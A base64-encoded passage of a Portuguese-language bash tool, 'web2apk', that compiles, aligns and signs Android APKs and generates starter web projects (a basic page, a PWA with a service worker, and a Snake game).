2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIGVsc2UKICAgIGphdmFjIC1zb3VyY2UgNyAtdGFyZ2V0IDcgLWNwICIkVzJBX0pBUiIgXAogICAgICAiJEJVSUxEL3NyYy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuamF2YSIgXAogICAgICAtZCAiJEJVSUxEL2NsYXNzZXMvIiAyPiYxIFwKICAgICAgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgZmkKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuY2xhc3MiIF0gfHwgX2VyciAnY29tcGlsYWNhbyBKYXZhIGZhbGhvdScKCiAgX2luZm8gJ2R4ICguY2xhc3MgLT4gLmRleCkuLi4nCiAgZHggLS1kZXggLS1vdXRwdXQ9IiRCVUlMRC9jbGFzc2VzLmRleCIgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy5kZXgiIF0gfHwgX2VyciAnZHggZmFsaG91JwoKICBfaW5mbyAnRW1wYWNvdGFuZG8gREVYLi4uJwogIChjZCAiJEJVSUxEIiAmJiB6aXAgLWogdW5zaWduZWQuYXBrIGNsYXNzZXMuZGV4KSA+IC9kZXYvbnVsbAoKICBfaW5mbyAnemlwYWxpZ24uLi4nCiAgemlwYWxpZ24gLWYgNCAiJEJVSUxEL3Vuc2lnbmVkLmFwayIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4vZGV2L251bGwKCiAgX2Vuc3VyZV9rZXlzdG9yZQogIGxvY2FsIEtTX0FMSUFTIEtTX1BBU1MKICBpZiBbICIkVzJBX0tTIiA9ICIkSE9NRS8ueHBtL3Rvb2xzL2Fwa3Rvb2wveHBtLWNvbXBhdC10ZXN0LmtleXN0b3JlIiBdOyB0aGVuCiAgICBLU19BTElBUz0neHBtLWNvbXBhdC10ZXN0JzsgS1NfUEFTUz0neHBtLWNvbXBhdC10ZXN0JwogIGVsc2UKICAgIEtTX0FMSUFTPSd3ZWIyYXBrJzsgS1NfUEFTUz0nd2ViMmFway1rZXknCiAgZmkKCiAgX2luZm8gJ2Fwa3NpZ25lci4uLicKICBhcGtzaWduZXIgc2lnbiBcCiAgICAtLWtzICIkVzJBX0tTIiAtLWtzLWtleS1hbGlhcyAiJEtTX0FMSUFTIiBcCiAgICAtLWtzLXBhc3MgcGFzczoiJEtTX1BBU1MiIC0ta2V5LXBhc3MgcGFzczoiJEtTX1BBU1MiIFwKICAgIC0tb3V0ICIkT1VUX0FQSyIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkT1VUX0FQSyIgXSB8fCBfZXJyICdhcGtzaWduZXIgZmFsaG91JwoKICBsb2NhbCBBUEtfU0laRTsgQVBLX1NJWkU9JChkdSAtaCAiJE9VVF9BUEsiIHwgY3V0IC1mMSkKICBwcmludGYgJ1xuXDAzM1sxOzMybSAgPT0gQVBLIHByb250byA9PVwwMzNbMG1cblxuJwogIF9vayAiQXJxdWl2byAgOiAkT1VUX0FQSyAoJEFQS19TSVpFKSIKICBfb2sgIlBhY2thZ2UgIDogJFBLR19OQU1FIgogIF9vayAiVmVyc2FvICAgOiAkVkVSU0lPTl9OQU1FICgkVkVSU0lPTl9DT0RFKSIKICBwcmludGYgJ1xuJwogIF9kaW0gIkluc3RhbGFyIDogdGVybXV4LW9wZW4gJyRPVVRfQVBLJyIKICBwcmludGYgJ1xuJwp9CgpfY21kX3RlbXBsYXRlKCkgewogIGxvY2FsIFRUWVBFPSIkezE6LX0iIE9VVERJUj0iJHsyOi19IgoKICAjIOKUgOKUgCBNZW51IGludGVyYXRpdm8gc2UgbsOjbyBmb2kgcGFzc2FkbyB0aXBvIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGlmIFsgLXogIiRUVFlQRSIgXTsgdGhlbgogICAgcHJpbnRmICJcblwwMzNbMTszNW0gIHdlYjJhcGsgdGVtcGxhdGUg4oCUIEdlcmFyIHByb2pldG8gZGUgZXhlbXBsb1wwMzNbMG1cblxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0xKVwwMzNbMG0gYmFzaWMgICDigJQgSFRNTCArIENTUyArIEpTIHNpbXBsZXMgKGJvYSBwYXJhIGNvbWXDp2FyKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0yKVwwMzNbMG0gcHdhICAgICDigJQgUHJvZ3Jlc3NpdmUgV2ViIEFwcCAob2ZmbGluZSwgaW5zdGFsbMOhdmVsKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0zKVwwMzNbMG0gZ2FtZSAgICDigJQgSm9nbyBjYW52YXMgc2ltcGxlcyAoU25ha2UpXG4iCiAgICBwcmludGYgIiAgXDAzM1sxOzMybTQpXDAzM1swbSBibGFuayAgIOKAlCBFc3F1ZWxldG8gbcOtbmltbyBzZW0gY29udGXDumRvXG5cbiIKICAgIHByaW50ZiAiICBUaXBvIFsxLTQgb3Ugbm9tZV06ICIKICAgIHJlYWQgLXIgVFRZUEUKICAgIGNhc2UgIiRUVFlQRSIgaW4KICAgICAgMSkgVFRZUEU9ImJhc2ljIiAgOzsKICAgICAgMikgVFRZUEU9InB3YSIgICAgOzsKICAgICAgMykgVFRZUEU9ImdhbWUiICAgOzsKICAgICAgNCkgVFRZUEU9ImJsYW5rIiAgOzsKICAgIGVzYWMKICBmaQoKICBbIC16ICIkT1VURElSIiBdICYmIE9VVERJUj0iLi8ke1RUWVBFfWFwcCIKCiAgaWYgWyAtZCAiJE9VVERJUiIgXSAmJiBbICIkKGxzIC1BICIkT1VURElSIiAyPi9kZXYvbnVsbCkiIF07IHRoZW4KICAgIHByaW50ZiAiXDAzM1sxOzMzbSAgRGlyZXTDs3JpbyAnJXMnIGrDoSBleGlzdGUgZSBuw6NvIGVzdMOhIHZhemlvLlwwMzNbMG1cbiIgIiRPVVRESVIiCiAgICBwcmludGYgIiAgQ29udGludWFyIG1lc21vIGFzc2ltPyBbcy9OXSAiCiAgICByZWFkIC1yIHJlc3AKICAgIFsgIiRyZXNwIiA9ICJzIiBdIHx8IFsgIiRyZXNwIiA9ICJTIiBdIHx8IHsgcHJpbnRmICIgIENhbmNlbGFkby5cblxuIjsgZXhpdCAwOyB9CiAgZmkKCiAgbWtkaXIgLXAgIiRPVVRESVIiCgogIGNhc2UgIiRUVFlQRSIgaW4KICAgIGJhc2ljKSAgX3RwbF9iYXNpYyAgIiRPVVRESVIiIDs7CiAgICBwd2EpICAgIF90cGxfcHdhICAgICIkT1VURElSIiA7OwogICAgZ2FtZSkgICBfdHBsX2dhbWUgICAiJE9VVERJUiIgOzsKICAgIGJsYW5rKSAgX3RwbF9ibGFuayAgIiRPVVRESVIiIDs7CiAgICAqKQogICAgICBwcmludGYgIlwwMzNbMTszMW0gIFRlbXBsYXRlIGRlc2NvbmhlY2lkbzogJXNcMDMzWzBtXG4iICIkVFRZUEUiCiAgICAgIHByaW50ZiAiICBPcMOnw7VlczogYmFzaWMgfCBwd2EgfCBnYW1lIHwgYmxhbmtcblxuIgogICAgICBleGl0IDEgOzsKICBlc2FjCgogIHByaW50ZiAiXG5cMDMzWzE7MzJtICBQcm9qZXRvIGNyaWFkbyBlbTogJXNcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgVGVzdGFyIG5vIGJyb3dzZXIgOiB0ZXJtdXgtb3BlbiAnJXMvaW5kZXguaHRtbCdcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgQnVpbGRhciBBUEsgICAgICAgOiB3ZWIyYXBrIGJ1aWxkICclcycgLS1uYW1lIFwiJXNcIlwwMzNbMG1cblxuIiAiJE9VVERJUiIgIiRUVFlQRSIKfQoKIyDilIDilIAgYmFzaWMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfYmFzaWMoKSB7CiAgbG9jYWwgRD0iJDEiCiAgY2F0ID4gIiREL2luZGV4Lmh0bWwiIDw8ICdIVE1MJwo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0icHQtQlIiPgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iPgogIDx0aXRsZT5NZXUgQXBwPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGhlYWRlcj4KICAgIDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT4KICA8L2hlYWRlcj4KICA8bWFpbj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8cD5PbMOhISBFc3RlIMOpIHVtIHRlbXBsYXRlIGLDoXNpY28gZ2VyYWRvIHBlbG8gPHN0cm9uZz53ZWIyYXBrPC9zdHJvbmc+LjwvcD4KICAgICAgPHAgaWQ9ImNvdW50ZXItbGFiZWwiPlZvY8OqIGNsaWNvdSA8c3BhbiBpZD0iY291bnQiPjA8L3NwYW4+IHZleihlcykuPC9wPgogICAgICA8YnV0dG9uIGlkPSJidG4iPkNsaXF1ZSBhcXVpPC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiIGlkPSJpbmZvLWNhcmQiPgogICAgICA8cCBpZD0iaW5mby10ZXh0Ij5BZ3VhcmRhbmRvIGludGVyYcOnw6NvLi4uPC9wPgogICAgPC9kaXY+CiAgPC9tYWluPgogIDxzY3JpcHQgc3JjPSJzY3JpcHQuanMiPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4KSFRNTAoKICBjYXQgPiAiJEQvc3R5bGUuY3NzIiA8PCAnQ1NTJwo6cm9vdCB7CiAgLS1iZzogICAgICAjMGYxMTE3OwogIC0tc3VyZmFjZTogIzFhMWQyNzsKICAtLWFjY2VudDogICMxYTczZTg7CiAgLS10ZXh0OiAgICAjZThlYWYwOwogIC0tbXV0ZWQ6ICAgIzhhOGZhODsKICAtLXJhZGl1czogIDE0cHg7Cn0KKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgY29sb3I6IHZhcigtLXRleHQpOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgbWluLWhlaWdodDogMTAwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CmhlYWRlciB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgcGFkZGluZzogMThweCAyMHB4OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzJhMmQzYTsKfQpoZWFkZXIgaDEgeyBmb250LXNpemU6IDEuNHJlbTsgY29sb3I6IHZhcigtLWFjY2VudCk7IH0KbWFpbiB7CiAgZmxleDogMTsKICBwYWRkaW5nOiAyMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDE2cHg7CiAgbWF4LXdpZHRoOiA1MDBweDsKICBtYXJnaW46IDAgYXV0bzsKICB3aWR0aDogMTAwJTsKfQouY2FyZCB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzKTsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7Cn0KLmNhcmQgcCB7IGNvbG9yOiB2YXIoLS1tdXRlZCk7IGxpbmUtaGVpZ2h0OiAxLjY7IG1hcmdpbi1ib3R0b206IDEwcHg7IH0KLmNhcmQgcDpsYXN0LWNoaWxkIHsgbWFyZ2luLWJvdHRvbTogMDsgfQpzcGFuI2NvdW50IHsgY29sb3I6IHZhcigtLWFjY2VudCk7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CmJ1dHRvbiB7CiAgbWFyZ2luLXRvcDogMTJweDsKICBiYWNrZ3JvdW5kOiB2YXIoLS1hY2NlbnQpOwogIGNvbG9yOiAjZmZmOwogIGJvcmRlcjogbm9uZTsKICBib3JkZXItcmFkaXVzOiAxMHB4OwogIHBhZGRpbmc6IDEycHggMjhweDsKICBmb250LXNpemU6IDFyZW07CiAgY3Vyc29yOiBwb2ludGVyOwogIHdpZHRoOiAxMDAlOwogIHRyYW5zaXRpb246IG9wYWNpdHkgLjE1czsKfQpidXR0b246YWN0aXZlIHsgb3BhY2l0eTogLjc1OyB9CkNTUwoKICBjYXQgPiAiJEQvc2NyaXB0LmpzIiA8PCAnSlMnCid1c2Ugc3RyaWN0JzsKCmNvbnN0IGJ0biAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bicpOwpjb25zdCBjb3VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudCcpOwpjb25zdCBpbmZvICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbmZvLXRleHQnKTsKbGV0IG4gPSAwOwoKYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gewogIG4rKzsKICBjb3VudC50ZXh0Q29udGVudCA9IG47CiAgY29uc3QgbXNncyA9IFsKICAgICdGdW5jaW9uYW5kbyBubyBBbmRyb2lkISDwn5qAJywKICAgICdXZWJWaWV3IHJvZGFuZG8gbGlzbyDwn46vJywKICAgICd3ZWIyYXBrIG5vIHRyYWJhbGhvISDimqEnLAogICAgJ0FQSyBwcm9udG8gcHJhIGRpc3RyaWJ1aXIg8J+TpicsCiAgICAnVm9jw6ogw6kgZmVyYSEgJyArIG4gKyAnIGNsaXF1ZXMhJwogIF07CiAgaW5mby50ZXh0Q29udGVudCA9IG1zZ3NbTWF0aC5taW4obiAtIDEsIG1zZ3MubGVuZ3RoIC0gMSldOwp9KTsKSlMKfQoKIyDilIDilIAgcHdhIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX3B3YSgpIHsKICBsb2NhbCBEPSIkMSIKICAjIFJlYXByb3ZlaXRhIG8gdmlzdWFsIGRvIGJhc2ljIGUgYWRpY2lvbmEgbWFuaWZlc3QgKyBzdwogIF90cGxfYmFzaWMgIiREIgoKICAjIFNvYnJlc2NyZXZlIG8gPGhlYWQ+IGRvIGluZGV4Lmh0bWwgcGFyYSBhZGljaW9uYXIgbWFuaWZlc3QKICBzZWQgLWkgJ3N8PHRpdGxlPk1ldSBBcHA8L3RpdGxlPnw8dGl0bGU+TWV1IFBXQTwvdGl0bGU+XG4gIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9Im1hbmlmZXN0Lmpzb24iPlxuICA8bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iIzFhNzNlOCI+fCcgIiREL2luZGV4Lmh0bWwiCiAgc2VkIC1pICdzfDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT58PGgxIGlkPSJhcHAtdGl0bGUiPk1ldSBQV0E8L2gxPnwnICIkRC9pbmRleC5odG1sIgogIHNlZCAtaSAnc3w8L2JvZHk+fCAgPHNjcmlwdD5pZigic2VydmljZVdvcmtlciJpbiBuYXZpZ2F0b3IpbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoInN3LmpzIik8L3NjcmlwdD5cbjwvYm9keT58JyAiJEQvaW5kZXguaHRtbCIKCiAgY2F0ID4gIiREL21hbmlmZXN0Lmpzb24iIDw8ICdKU09OJwp7CiAgIm5hbWUiOiAiTWV1IFBXQSIsCiAgInNob3J0X25hbWUiOiAiUFdBIiwKICAic3RhcnRfdXJsIjogIi4iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwZjExMTciLAogICJ0aGVtZV9jb2xvciI6ICIjMWE3M2U4IiwKICAiaWNvbnMiOiBbCiAgICB7ICJzcmMiOiAiaWNvbi0xOTIucG5nIiwgInNpemVzIjogIjE5MngxOTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0sCiAgICB7ICJzcmMiOiAiaWNvbi01MTIucG5nIiwgInNpemVzIjogIjUxMng1MTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0KICBdCn0KSlNPTgoKICBjYXQgPiAiJEQvc3cuanMiIDw8ICdTVycKY29uc3QgQ0FDSEUgPSAncHdhLXYxJzsKY29uc3QgQVNTRVRTID0gWycvJywgJy9pbmRleC5odG1sJywgJy9zdHlsZS5jc3MnLCAnL3NjcmlwdC5qcycsICcvbWFuaWZlc3QuanNvbiddOwoKc2VsZi5hZGRFdmVudExpc3RlbmVyKCdpbnN0YWxsJywgZSA9PgogIGUud2FpdFVudGlsKGNhY2hlcy5vcGVuKENBQ0hFKS50aGVuKGMgPT4gYy5hZGRBbGwoQVNTRVRTKSkpKTsKCnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignZmV0Y2gnLCBlID0+CiAgZS5yZXNwb25kV2l0aChjYWNoZXMubWF0Y2goZS5yZXF1ZXN0KS50aGVuKHIgPT4gciB8fCBmZXRjaChlLnJlcXVlc3QpKSkpOwpTVwp9CgojIOKUgOKUgCBnYW1lIChTbmFrZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfZ2FtZSgpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPlNuYWtlPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGgxPvCfkI0gU25ha2U8L2gxPgogIDxjYW52YXMgaWQ9ImMiIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48L2NhbnZhcz4KICA8cCBpZD0ic2NvcmUiPlBvbnRvczogMDwvcD4KICA8ZGl2IGlkPSJkcGFkIj4KICAgIDxidXR0b24gZGF0YS1kPSJVUCI+4payPC9idXR0b24+CiAgICA8ZGl2PgogICAgICA8YnV0dG9uIGRhdGEtZD0iTEVGVCI+4peAPC9idXR0b24+CiAgICAgIDxidXR0b24gZGF0YS1kPSJSSUdIVCI+4pa2PC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxidXR0b24gZGF0YS1kPSJET1dOIj7ilrw8L2J1dHRvbj4KICA8L2Rpdj4KICA8c2NyaXB0IHNyYz0ic2NyaXB0LmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CkhUTUwKCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiAjMGYxMTE3OwogIGNvbG9yOiAjZThlYWYwOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgcGFkZGluZzogMjBweCAxMHB4OwogIGdhcDogMTJweDsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpoMSB7IGZvbnQtc2l6ZTogMS41cmVtOyBjb2xvcjogIzFhNzNlODsgfQpjYW52YXMgewogIGJvcmRlcjogMnB4IHNvbGlkICMxYTczZTg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIHRvdWNoLWFjdGlvbjogbm9uZTsKfQojc2NvcmUgeyBjb2xvcjogIzhhOGZhODsgZm9udC1zaXplOiAxLjFyZW07IH0KI2RwYWQgIHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA2cHg7IH0KI2RwYWQgZGl2IHsgZGlzcGxheTogZmxleDsgZ2FwOiA2cHg7IH0KI2RwYWQgYnV0dG9uIHsKICBiYWNrZ3JvdW5kOiAjMWExZDI3OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICBjb2xvcjogI2U4ZWFmMDsKICBmb250LXNpemU6IDEuNHJlbTsKICB3aWR0aDogNTZweDsgaGVpZ2h0OiA1NnB4OwogIGN1cnNvcjogcG9pbnRlcjsKfQojZHBhZCBidXR0b246YWN0aXZlIHsgYmFja2dyb3VuZDogIzFhNzNlODsgfQpDU1MKCiAgY2F0ID4gIiREL3NjcmlwdC5qcyIgPDwgJ0pTJwondXNlIHN0cmljdCc7CmNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjJyk7CmNvbnN0IGN0eCAgICA9IGNhbnZhcy5nZXRDb250ZXh0KCcyZCcpOwpjb25zdCBTWiA9IDE1LCBDT0xTID0gMjAsIFJPV1MgPSAyMDsKCmxldCBzbmFrZSwgZGlyLCBmb29kLCBzY29yZSwgcnVubmluZywgbG9vcDsKCmZ1bmN0aW9uIGluaXQoKSB7CiAgc25ha2UgICA9IFt7eDo1LCB5OjEwfSx7eDo0LHk6MTB9LHt4OjMseToxMH1dOwogIGRpciAgICAgPSB7eDoxLCB5OjB9OwogIGZvb2QgICAgPSBybmRGb29kKCk7CiAgc2NvcmUgICA9IDA7CiAgcnVubmluZyA9IHRydWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAwJzsKICBjbGVhckludGVydmFsKGxvb3ApOwogIGxvb3AgPSBzZXRJbnRlcnZhbCh0aWNrLCAxMzApOwp9CgpmdW5jdGlvbiBybmRGb29kKCkgewogIHJldHVybiB7IHg6IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpDT0xTKSwgeTogTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKlJPV1MpIH07Cn0KCmZ1bmN0aW9uIHRpY2soKSB7CiAgY29uc3QgaGVhZCA9IHsgeDogc25ha2VbMF0ueCArIGRpci54LCB5OiBzbmFrZVswXS55ICsgZGlyLnkgfTsKICBpZiAoaGVhZC54IDwgMCB8fCBoZWFkLnggPj0gQ09MUyB8fCBoZWFkLnkgPCAwIHx8IGhlYWQueSA+PSBST1dTIHx8CiAgICAgIHNuYWtlLnNvbWUocyA9PiBzLnggPT09IGhlYWQueCAmJiBzLnkgPT09IGhlYWQueSkpIHsKICAgIGNsZWFySW50ZXJ2YWwobG9vcCk7CiAgICBydW5uaW5nID0gZmFsc2U7CiAgICBjdHguZmlsbFN0eWxlID0gJ3JnYmEoMCwwLDAsLjYpJzsKICAgIGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgICBjdHguZmlsbFN0eWxlID0gJyNmZmYnOwogICAgY3R4LmZvbnQgPSAnYm9sZCAyNHB4IHN5c3RlbS11aSc7CiAgICBjdHgudGV4dEFsaWduID0gJ2NlbnRlcic7CiAgICBjdHguZmlsbFRleHQoJ0dhbWUgT3ZlcicsIDE1MCwgMTM1KTsKICAgIGN0eC5mb250ID0gJzE2cHggc3lzdGVtLXVpJzsKICAgIGN0eC5maWxsVGV4dCgnVG9xdWUgcGFyYSByZWluaWNpYXInLCAxNTAsIDE2NSk7CiAgICByZXR1cm47CiAgfQogIHNuYWtlLnVuc2hpZnQoaGVhZCk7CiAgaWYgKGhlYWQueCA9PT0gZm9vZC54ICYmIGhlYWQueSA9PT0gZm9vZC55KSB7CiAgICBzY29yZSsrOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAnICsgc2NvcmU7CiAgICBmb29kID0gcm5kRm9vZCgpOwogIH0gZWxzZSB7IHNuYWtlLnBvcCgpOyB9CiAgZHJhdygpOwp9CgpmdW5jdGlvbiBkcmF3KCkgewogIGN0eC5maWxsU3R5bGUgPSAnIzBmMTExNyc7IGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgY3R4LmZpbGxTdHlsZSA9ICcjMWE3M2U4JzsKICBzbmFrZS5mb3JFYWNoKChzLGkpID0+IHsKICAgIGN0eC5nbG9iYWxBbHBoYSA9IGkgPT09IDAgPyAxIDogMC43OwogICAgcm91bmRSZWN0KHMueCpTWisxLCBzLnkqU1orMSwgU1otMiwgU1otMiwgMyk7CiAgfSk7CiAgY3R4Lmdsb2JhbEFscGhhID0gMTsKICBjdHguZmlsbFN0eWxlID0gJyNlNTM5MzUnOwogIHJvdW5kUmVjdChmb29kLngqU1orMSwgZm9vZC55KlNaKzEsIFNaLTIsIFNaLTIsIDMpOwp9CgpmdW5jdGlvbiByb3VuZFJlY3QoeCx5LHcsaCxyKSB7CiAgY3R4LmJlZ2luUGF0aCgpOwogIGN0eC5yb3VuZFJlY3QoeCx5LHcsaCxyKTsKICBjdHguZmlsbCgpOwp9Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZSA9PiB7CiAgY29uc3QgbWFwID0ge0Fycm93VXA6e3g6MCx5Oi0xfSxBcnJvd0Rvd246e3g6MCx5OjF9LEFycm93TGVmdDp7eDotMSx5OjB9LEFycm93UmlnaHQ6e3g6MSx5OjB9fTsKICBpZiAobWFwW2Uua2V5XSAmJiAhKG1hcFtlLmtleV0ueD09PS1kaXIueCAmJiBtYXBbZS5rZXldLnk9PT0tZGlyLnkpKSBkaXIgPSBtYXBbZS5rZXldOwp9KTsKCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNkcGFkIGJ1dHRvbicpLmZvckVhY2goYnRuID0+IHsKICBidG4uYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsIGUgPT4gewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKCFydW5uaW5nKSB7IGluaXQoKTsgcmV0dXJuOyB9CiAgICBjb25zdCBtYXAgPSB7VVA6e3g6MCx5Oi0xfSxET1dOOnt4OjAseToxfSxMRUZUOnt4Oi0xLHk6MH0sUklHSFQ6e3g6MSx5OjB9fTsKICAgIGNvbnN0IGQgPSBtYXBbYnRuLmRhdGFzZXQuZF07CiAgICBpZiAoZCAmJiAhKGQueD09PS1kaXIueCAmJiBkLnk9PT0tZGlyLnkpKSBkaXIgPSBkOwogIH0pOwp9KTsKCmNhbnZhcy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgaWYgKCFydW5uaW5nKSBpbml0KCk7IH0pOwppbml0KCk7CkpTCn0KCiMg4pSA4pSAIGJsYW5rIOKUgOKUgOKUgOKUgOKUgOKUgOKUgO